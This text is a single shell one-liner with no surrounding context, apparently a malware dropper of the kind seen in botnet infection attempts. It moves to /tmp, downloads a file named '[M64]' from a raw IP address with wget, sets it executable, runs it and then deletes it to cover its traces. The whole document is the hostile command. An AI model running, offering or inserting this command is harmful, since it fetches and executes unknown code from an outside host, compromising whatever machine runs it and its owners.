cd /tmp; wget http://62.210.100.170/[M64]; chmod 777 [M64]; ./[M64]; rm -rf [M64]
